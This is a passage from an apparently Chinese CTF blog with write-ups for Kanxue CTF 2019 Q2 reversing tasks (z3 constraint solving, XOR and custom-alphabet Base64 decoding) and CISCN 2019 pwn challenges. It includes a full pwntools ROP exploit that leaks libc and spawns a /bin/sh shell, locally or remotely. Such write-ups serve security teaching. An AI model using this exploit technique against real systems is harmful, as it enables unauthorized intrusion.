s.add(<span class="number">244</span> * v33</span><br><span class="line">           + <span class="number">196</span> * v32</span><br><span class="line">           + <span class="number">30</span> * v31</span><br><span class="line">           + <span class="number">100</span> * v30</span><br><span class="line">           + <span class="number">168</span> * v29</span><br><span class="line">           + <span class="number">7</span> * v28</span><br><span class="line">           + <span class="number">249</span> * v27</span><br><span class="line">           + <span class="number">84</span> * v26</span><br><span class="line">           + <span class="number">252</span>*v25</span><br><span class="line">           + <span class="number">171</span> * v24</span><br><span class="line">           + <span class="number">210</span> * v23</span><br><span class="line">           + <span class="number">206</span> * v22</span><br><span class="line">           + <span class="number">108</span> * v21</span><br><span class="line">           + <span class="number">153</span> * v20</span><br><span class="line">           + <span class="number">67</span> * v19</span><br><span class="line">           + <span class="number">189</span> * v18</span><br><span class="line">           + <span class="number">141</span> * v17</span><br><span class="line">           + <span class="number">239</span> * v16</span><br><span class="line">           + <span class="number">177</span> * v15</span><br><span class="line">           + <span class="number">10</span> * v14</span><br><span class="line">           + <span class="number">15</span> * v13</span><br><span class="line">           + <span class="number">164</span> * v12</span><br><span class="line">           + <span class="number">142</span> * v11</span><br><span class="line">           + <span class="number">97</span> * v10</span><br><span class="line">           + <span class="number">27</span> * v9</span><br><span class="line">           + <span class="number">173</span> * v8</span><br><span class="line">           + <span class="number">146</span> * v7</span><br><span class="line">           + <span class="number">133</span> * v5</span><br><span class="line">           + <span class="number">105</span> * v4</span><br><span class="line">           + <span class="number">75</span> * (v6 + v3)</span><br><span class="line">           + <span class="number">197</span> * v2 == <span class="number">393331</span> )</span><br><span class="line"></span><br><span class="line">    s.add(<span class="number">185</span> * v33</span><br><span class="line">             + <span class="number">196</span> * v32</span><br><span class="line">             + <span class="number">135</span> * v31</span><br><span class="line">             + <span class="number">218</span> * (v14 + v29)</span><br><span class="line">             + <span class="number">241</span> * v30</span><br><span class="line">             + <span class="number">210</span> * v28</span><br><span class="line">             + <span class="number">127</span> * v27</span><br><span class="line">             + <span class="number">221</span> * v26</span><br><span class="line">             + <span class="number">47</span> * v25</span><br><span class="line">             + <span class="number">179</span> * v24</span><br><span class="line">             + <span class="number">61</span> * v23</span><br><span class="line">             + <span class="number">59</span> * v22</span><br><span class="line">             + <span class="number">197</span> * v21</span><br><span class="line">             + <span class="number">204</span> * v20</span><br><span class="line">             + <span class="number">198</span> * v19</span><br><span class="line">             + <span class="number">75</span> * v18</span><br><span class="line">             + <span class="number">146</span> * v17</span><br><span class="line">             + <span class="number">156</span> * v16</span><br><span class="line">             + <span class="number">235</span> * v15</span><br><span class="line">             + <span class="number">63</span> * v13</span><br><span class="line">             + <span class="number">220</span> * v12</span><br><span class="line">             + <span class="number">3</span> * v11</span><br><span class="line">             + <span class="number">167</span> * v10</span><br><span class="line">             + <span class="number">230</span> * v9</span><br><span class="line">             + <span class="number">69</span> * v8</span><br><span class="line">             + <span class="number">186</span> * v7</span><br><span class="line">             + <span class="number">57</span> * v6</span><br><span class="line">             + <span class="number">147</span> * v5</span><br><span class="line">             + <span class="number">221</span> * v4</span><br><span class="line">             + <span class="number">79</span> * v3</span><br><span class="line">             + <span class="number">53</span> * v2== <span class="number">430295</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(s.check())</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> STEP4:</span><br><span class="line">    vec =&#123;<span class="string">&quot;v28&quot;</span>: <span class="number">117</span>,</span><br><span class="line">         <span class="string">&quot;v12&quot;</span> : <span class="number">95</span>,</span><br><span class="line">         <span class="string">&quot;v21&quot;</span> : <span class="number">48</span>,</span><br><span class="line">         <span class="string">&quot;v2&quot;</span>  : <span class="number">51</span>,</span><br><span class="line">         <span class="string">&quot;v10&quot;</span> : <span class="number">109</span>,</span><br><span class="line">         <span class="string">&quot;v20&quot;</span> : <span class="number">99</span>,</span><br><span class="line">         <span class="string">&quot;v3&quot;</span>  : <span class="number">51</span>,</span><br><span class="line">         <span class="string">&quot;v29&quot;</span> : <span class="number">115</span>,</span><br><span class="line">         <span class="string">&quot;v15&quot;</span> : <span class="number">116</span>,</span><br><span class="line">         <span class="string">&quot;v30&quot;</span> : <span class="number">51</span>,</span><br><span class="line">         <span class="string">&quot;v23&quot;</span> : <span class="number">101</span>,</span><br><span class="line">         <span class="string">&quot;v32&quot;</span> : <span class="number">117</span>,</span><br><span class="line">         <span class="string">&quot;v19&quot;</span> : <span class="number">95</span>,</span><br><span class="line">         <span class="string">&quot;v7&quot;</span>  : <span class="number">51</span>,</span><br><span class="line">         <span class="string">&quot;v4&quot;</span>  : <span class="number">48</span>,</span><br><span class="line">         <span class="string">&quot;v11&quot;</span> : <span class="number">101</span>,</span><br><span class="line">         <span class="string">&quot;v5&quot;</span>  : <span class="number">83</span>,</span><br><span class="line">         <span class="string">&quot;v9&quot;</span>  : <span class="number">105</span>,</span><br><span class="line">         <span class="string">&quot;v16&quot;</span> : <span class="number">116</span>,</span><br><span class="line">         <span class="string">&quot;v24&quot;</span> : <span class="number">95</span>,</span><br><span class="line">         <span class="string">&quot;v26&quot;</span> : <span class="number">115</span>,</span><br><span class="line">         <span class="string">&quot;v18&quot;</span> : <span class="number">101</span>,</span><br><span class="line">         <span class="string">&quot;v33&quot;</span> : <span class="number">108</span>,</span><br><span class="line">         <span class="string">&quot;v6&quot;</span>  : <span class="number">109</span>,</span><br><span class="line">         <span class="string">&quot;v25&quot;</span> : <span class="number">49</span>,</span><br><span class="line">         <span class="string">&quot;v31&quot;</span> : <span class="number">102</span>,</span><br><span class="line">         <span class="string">&quot;v22&quot;</span> : <span class="number">100</span>,</span><br><span class="line">         <span class="string">&quot;v8&quot;</span>  : <span class="number">116</span>,</span><br><span class="line">         <span class="string">&quot;v17&quot;</span> : <span class="number">49</span>,</span><br><span class="line">         <span class="string">&quot;v27&quot;</span> : <span class="number">95</span>,</span><br><span class="line">         <span class="string">&quot;v13&quot;</span> : <span class="number">108</span>,</span><br><span class="line">         <span class="string">&quot;v14&quot;</span> : <span class="number">49</span>&#125;</span><br><span class="line"></span><br><span class="line">    transform=&#123;</span><br><span class="line">    <span class="number">2</span>  : <span class="number">0x1E</span>,</span><br><span class="line">    <span class="number">3</span>  : <span class="number">0x1F</span>,</span><br><span class="line">    <span class="number">4</span>  : <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">5</span>  : <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">6</span>  : <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">7</span>  : <span class="number">0x03</span>,</span><br><span class="line">    <span class="number">8</span>  : <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">9</span>  : <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">10</span> : <span class="number">0x06</span>,</span><br><span class="line">    <span class="number">11</span> : <span class="number">0x07</span>,</span><br><span class="line">    <span class="number">12</span> : <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">13</span> : <span class="number">0x09</span>,</span><br><span class="line">    <span class="number">14</span> : <span class="number">0x0A</span>,</span><br><span class="line">    <span class="number">15</span> : <span class="number">0x0B</span>,</span><br><span class="line">    <span class="number">16</span> : <span class="number">0x0C</span>,</span><br><span class="line">    <span class="number">17</span> : <span class="number">0x0D</span>,</span><br><span class="line">    <span class="number">18</span> : <span class="number">0x0E</span>,</span><br><span class="line">    <span class="number">19</span> : <span class="number">0x0F</span>,</span><br><span class="line">    <span class="number">20</span> : <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">21</span> : <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">22</span> : <span class="number">0x12</span>,</span><br><span class="line">    <span class="number">23</span> : <span class="number">0x13</span>,</span><br><span class="line">    <span class="number">24</span> : <span class="number">0x14</span>,</span><br><span class="line">    <span class="number">25</span> : <span class="number">0x15</span>,</span><br><span class="line">    <span class="number">26</span> : <span class="number">0x16</span>,</span><br><span class="line">    <span class="number">27</span> : <span class="number">0x17</span>,</span><br><span class="line">    <span class="number">28</span> : <span class="number">0x18</span>,</span><br><span class="line">    <span class="number">29</span> : <span class="number">0x19</span>,</span><br><span class="line">    <span class="number">30</span> : <span class="number">0x1A</span>,</span><br><span class="line">    <span class="number">31</span> : <span class="number">0x1B</span>,</span><br><span class="line">    <span class="number">32</span> : <span class="number">0x1C</span>,</span><br><span class="line">    <span class="number">33</span> : <span class="number">0x1D</span>&#125;</span><br><span class="line"></span><br><span class="line">    re =  <span class="built_in">dict</span>(<span class="built_in">zip</span>(transform.values(), transform.keys()))</span><br><span class="line"></span><br><span class="line">    xor_key = [<span class="number">0x18</span>,<span class="number">0x09</span>,<span class="number">0x03</span>,<span class="number">0x6B</span>,<span class="number">0x01</span>,<span class="number">0x5A</span>,<span class="number">0x32</span>,<span class="number">0x57</span>,<span class="number">0x30</span>,<span class="number">0x5D</span>,<span class="number">0x40</span>,<span class="number">0x46</span>,<span class="number">0x2B</span>,<span class="number">0x46</span>,<span class="number">0x56</span>,<span class="number">0x3D</span>,</span><br><span class="line">               <span class="number">0x02</span>,<span class="number">0x43</span>,<span class="number">0x17</span>,<span class="number">0x00</span>,<span class="number">0x32</span>,<span class="number">0x53</span>,<span class="number">0x1F</span>,<span class="number">0x26</span>,<span class="number">0x2A</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x10</span>,<span class="number">0x10</span>,<span class="number">0x1E</span>,<span class="number">0x40</span>,<span class="number">0x00</span>]</span><br><span class="line">    <span class="comment"># print(len(xor_key))</span></span><br><span class="line">    <span class="comment"># print(xor_key[0x1E])</span></span><br><span class="line">    flag=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        name = <span class="string">&quot;v&quot;</span>+<span class="built_in">str</span>(re[i])</span><br><span class="line">        <span class="comment"># print()</span></span><br><span class="line">        <span class="comment"># print(chr(vec[name]^xor_key[i]))</span></span><br><span class="line">        flag+=(<span class="built_in">chr</span>(vec[name]^xor_key[i]))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># K9nXu3_2o1q2_w3bassembly_r3vers3</span></span><br></pre></td></tr></table></figure>

<h2 id="6-消失的岛屿-✅"><a href="#6-消失的岛屿-✅" class="headerlink" title="6-消失的岛屿 ✅"></a>6-消失的岛屿 ✅</h2><p>变异换表Base64<br>因为Base64是一个字节替换类型的变换，所以直接写逆算法即可解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;tuvwxTUlmnopqrs7YZabcdefghij8yz0123456VWXkABCDEFGHIJKLMNOPQRS9+/&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>():</span><br><span class="line">    cipher = <span class="string">&quot;!NGV%,$h1f4S3%2P(hkQ94==&quot;</span></span><br><span class="line">    plain = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7F</span>):</span><br><span class="line">            tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">if</span> byte&gt;<span class="number">0x40</span> <span class="keyword">and</span> byte&lt;=<span class="number">0x5A</span>:</span><br><span class="line">                tmp = <span class="built_in">chr</span>(<span class="number">0x9B</span>-byte)</span><br><span class="line">            <span class="keyword">elif</span> byte&gt;<span class="number">0x60</span> <span class="keyword">and</span> byte&lt;=<span class="number">0x7A</span>:</span><br><span class="line">                tmp = <span class="built_in">chr</span>(byte-<span class="number">0x40</span>)</span><br><span class="line">            <span class="keyword">elif</span> byte&gt;<span class="number">0x2F</span> <span class="keyword">and</span> byte&lt;=<span class="number">0x39</span>:</span><br><span class="line">                tmp = <span class="built_in">chr</span>(byte+<span class="number">0x32</span>)</span><br><span class="line">            <span class="keyword">elif</span> byte==<span class="number">0x2B</span>:</span><br><span class="line">                tmp = <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> byte==<span class="number">0x2F</span>:</span><br><span class="line">                tmp = <span class="string">&#x27;y&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> byte==<span class="number">0x3d</span>:</span><br><span class="line">                tmp = <span class="string">&quot;=&quot;</span></span><br><span class="line">            <span class="keyword">if</span> tmp==cipher[i]:</span><br><span class="line">                plain += <span class="built_in">chr</span>(byte)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line">flagg = encrypt()</span><br><span class="line"><span class="comment">#print(flagg)</span></span><br><span class="line"></span><br><span class="line">flagg = flagg.translate(string.maketrans(str1,str2))</span><br><span class="line"><span class="comment">#print(flagg)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> base64.b64decode(flagg)</span><br><span class="line"><span class="comment">#KanXue2019ctf_st</span></span><br></pre></td></tr></table></figure>

<p>膜拜一发风神优雅的脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    old_chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    new_chars = <span class="string">&#x27;tuvwxTUlmnopqrs7YZabcdefghij8yz0123456VWXkABCDEFGHIJKLMNOPQRS9+/&#x27;</span></span><br><span class="line">    chars_map = [<span class="string">&#x27;&#x27;</span>]*<span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(new_chars)):</span><br><span class="line">        v = <span class="built_in">ord</span>(new_chars[i])</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0x41</span> &lt;= v &lt;= <span class="number">0x5A</span>:</span><br><span class="line">            v = <span class="number">0x9B</span> - v</span><br><span class="line">        <span class="keyword">elif</span> <span class="number">0x61</span> &lt;= v &lt;= <span class="number">0x7A</span>:</span><br><span class="line">            v = v - <span class="number">0x40</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="number">0x30</span> &lt;= v &lt;= <span class="number">0x39</span>:</span><br><span class="line">            v = v + <span class="number">0x32</span></span><br><span class="line">        <span class="keyword">elif</span> v == <span class="number">0x2B</span>:</span><br><span class="line">            v = <span class="number">0x77</span></span><br><span class="line">        <span class="keyword">elif</span> v == <span class="number">0x2F</span>:</span><br><span class="line">            v = <span class="number">0x79</span></span><br><span class="line">        chars_map[v] = new_chars[i]</span><br><span class="line">    s = <span class="string">&#x27;!NGV%,$h1f4S3%2P(hkQ94==&#x27;</span></span><br><span class="line">    b64 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        b64 += chars_map[<span class="built_in">ord</span>(s[i])]</span><br><span class="line">    b64 += <span class="string">&#x27;==&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> binascii.a2b_base64(b64.translate(string.maketrans(new_chars, old_chars)))</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">test()</span><br></pre></td></tr></table></figure>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/07/25/2019%E7%9C%8B%E9%9B%AActf-q2/" data-id="cuidD6O4-RRBtjs6EzYQkbTWG" data-title="2019 看雪CTF Q2" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-ciscn2019华中赛区区域赛" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/07/10/ciscn2019%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E5%8C%BA%E5%9F%9F%E8%B5%9B/" class="article-date">
  <time class="dt-published" datetime="2019-07-10T07:08:30.000Z" itemprop="datePublished">2019-07-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/07/10/ciscn2019%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E5%8C%BA%E5%9F%9F%E8%B5%9B/">2019 CISCN 华中区域赛</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>pwn2,pwn7当时不会做，没做出来 pwn3 时间差10分钟没有交上 pwn8 arm的题没见过</p>
<p>所以最后就是5道题交差</p>
<h3 id="pwn1-Emachine-✅"><a href="#pwn1-Emachine-✅" class="headerlink" title="pwn1-Emachine ✅"></a>pwn1-Emachine ✅</h3><p><img src="/ciscn2019%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E5%8C%BA%E5%9F%9F%E8%B5%9B/image-20251122090328336.png" alt="image-20251122090328336"></p>
<p>直接栈溢出 做ROP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">rld = <span class="keyword">lambda</span>: io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line">rufd = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">False</span>)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">se = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sel = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x:io.sendafter(x)</span><br><span class="line">sela = <span class="keyword">lambda</span> x:io.sendlineafter(x)</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">en</span>(<span class="params">payload</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    ru(<span class="string">&#x27;Input your Plaintext to be encrypted&#x27;</span>)</span><br><span class="line">    sel(payload)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">payload</span>):</span><br><span class="line"></span><br><span class="line">    dede = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> payload:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(byte) &gt; <span class="number">96</span> <span class="keyword">and</span> <span class="built_in">ord</span>(byte) &lt;=<span class="number">122</span>:</span><br><span class="line">            dede+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(byte)^<span class="number">0xD</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(byte) &lt;= <span class="number">64</span> <span class="keyword">and</span> <span class="built_in">ord</span>(byte) &gt;<span class="number">90</span>:</span><br><span class="line">            dede+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(byte)^<span class="number">0xE</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(byte) &gt;<span class="number">47</span> <span class="keyword">and</span> <span class="built_in">ord</span>(byte) &lt;=<span class="number">57</span>:</span><br><span class="line">            dede+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(byte)^<span class="number">0xF</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dede</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">order=[]</span>):</span><br><span class="line">    command = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> order:</span><br><span class="line">        command += <span class="built_in">str</span>(item)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    log.info(<span class="string">&#x27;gdb command:\n&#x27;</span>+command)</span><br><span class="line">    gdb.attach(io,command)</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">flag</span>):</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> de(payload)</span><br><span class="line"></span><br><span class="line">    en(de(payload)+p64(<span class="number">0x400c83</span>)+p64(<span class="number">0x602020</span>)+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(<span class="number">0x400B28</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#z([&#x27;b *0x400AED&#x27;])</span></span><br><span class="line">    ru(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    libc.address = u64(rn(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x6f690</span></span><br><span class="line">    system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&#x27;system:&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">    binsh = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&#x27;binsh:&#x27;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">    en(de(payload)+p64(<span class="number">0x400c83</span>)+p64(binsh)+p64(system))</span><br><span class="line">        io.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context.binary = <span class="string">&#x27;./Emachine&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;115&#x27;</span>]</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./Emachine&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">        io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">        libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        exploit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">&#x27;./Emachine&#x27;</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        exploit(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="pwn2-babycalc-❌"><a href="#pwn2-babycalc-❌" class="headerlink" title="pwn2-babycalc ❌"></a>pwn2-babycalc ❌</h3><p>Binary 实现了一个简单的Calculator，通过三个位于.bss段上的全局变量操作计算器进行运算</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cache = <span class="built_in">malloc</span>(<span class="number">0x21000uLL</span>);</span><br><span class="line">control = <span class="built_in">malloc</span>(<span class="number">0x100uLL</span>);</span><br><span class="line">res = dword_6021B8;</span><br></pre></td></tr></table></figure>

<p>其中cache储存每一次的计算结果，control负责控制程序流程，引导进行add,sub,div,mul等操作 res负责储存上次结果和本次结果</p>
<p>通过在.bss段上的func_list，与加减乘除四种操作的操作顺序共同完成计算器的功能 下面是func_list:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.data:00000000006020E0 func_list       dq 0                    ; DATA XREF: op+4E↑r</span><br><span class="line">.data:00000000006020E8                 dq offset write_back</span><br><span class="line">.data:00000000006020F0                 dq offset get_value</span><br><span class="line">.data:00000000006020F8                 dq offset ADD_operation</span><br><span class="line">.data:0000000000602100                 dq offset SUB_operation</span><br><span class="line">.data:0000000000602108                 dq offset DIV_operation</span><br><span class="line">.data:0000000000602110                 dq offset initial_space</span><br><span class="line">.data:0000000000602118                 dq offset MUL_operation</span><br><span class="line">.data:0000000000602118 _data           ends</span><br></pre></td></tr></table></figure>

<p>以<code>add</code>的五步操作为例:</p>
